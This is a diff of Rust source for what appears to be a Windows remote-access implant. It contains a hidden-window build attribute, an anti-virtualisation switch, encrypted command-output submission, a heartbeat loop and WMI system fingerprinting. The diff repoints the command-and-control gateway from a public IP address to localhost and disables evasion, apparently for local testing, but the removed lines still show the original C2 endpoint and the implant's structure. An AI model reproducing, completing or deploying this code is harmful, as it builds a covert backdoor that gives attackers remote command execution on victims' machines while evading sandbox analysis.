@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 extern crate colored; 
 
 use core::time::Duration;
@@ -76,16 +76,16 @@ pub struct Win32BIOS {
 
 const BUILD_ID: &str = "debug";
 const CONNECTION_INTERVAL: u64 = 5;
-const ANTI_VIRTUAL: bool = true;
-const GATEWAY_PATH: &str = "http://109.107.189.154:80/gateway";
+const ANTI_VIRTUAL: bool = false;
+const GATEWAY_PATH: &str = "http://127.0.0.1:9999/gateway";
 const SERVER_RSA_PUB: &str = "
 -----BEGIN RSA PUBLIC KEY-----
-MIIBCgKCAQEAsG8YIs0tjiau5c0ME9EOvBru1FcgPoxW6xkzS9u7NdVsXVfMz+gO
-g0JBTEqm+OpYjgCT34FYM/VQqzCl+y0HtCAP23XYuJrxPSiYdNFxrjsUBEzw5Spi
-RFvvKPs+lWS6zl20sm35h1BoN+ZbgGrtCavnrzydOByiP/Epon1UKWc81QmmY2ec
-xcXp9GsFXlV93Cc6ZMhxhWtwlv7j1iU3hQeA+8Jxz5IZnRmwSdeGWqq0xcMgBW9a
-F0X8kyvTd4Xb9QKK4wZ7rVHbs0sfEhfo6PVBOaJQS6ubmD/RooJdmGdhP4wnJC3b
-9Ea8L+hHTaylw+ghBgq+9wCrnDVyvxMGDQIDAQAB
+MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
+SDy/LhGjCjOMvX/2Eg0wsed99hntvZ2b6RKdsdfrSVUFxvp6H0lEVPGPjDCMssjY
+RLi3JbKIopLtgdDHdnf4nCpnSrMNFV5ZuqdIoQIMaw/imyWATNSB18WOebAA8lI9
+oR0XG89Ob3/IyxIAK1rUqlx1a1oJ+uBsLscsxwOGWyXir6by31uVfrdzxORFviCr
+8bZfuX5wF06WQ9TH1WFAw/G4CTTWP5qooLug04Qt7cAemTLfJjkyaDeLq20ia2ix
+xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
 -----END RSA PUBLIC KEY-----
 ";
 
@@ -236,7 +236,7 @@ fn submit_output(client_id: &str, command_id: &str, output: &str, encryption_key
         aes_256cbc_encrypt(&json!({
             "action": "submit_output",
             "command_id": command_id,
-            "output": output
+            "output": "Command completed!"
         }).to_string(), encryption_key.as_bytes()).unwrap()
     );
 
@@ -252,11 +252,8 @@ fn submit_output(client_id: &str, command_id: &str, output: &str, encryption_key
     };
 }
 
-
-
 fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
 
-    // Use arc rwlocks later
     let mut client_id = client_id_intake.clone();
     let mut encryption_key = encryption_key_intake.clone();
     
@@ -551,11 +548,11 @@ fn init_connection() -> (String, String) {
         }
     };
 
-    let ram: u32 = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem") {
+    let ram: u64 = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem") {
         Ok(results) => {
             results.iter().map(|os| 
                 parse_wmi(&os["TotalPhysicalMemory"])
-            ).collect::<Vec<_>>().join("").parse::<u32>().unwrap()  / 1024 / 1024 / 1024
+            ).collect::<Vec<_>>().join("").parse::<u64>().unwrap()  / 1024 / 1024 / 1024
         }, 
 
         Err(error) => {
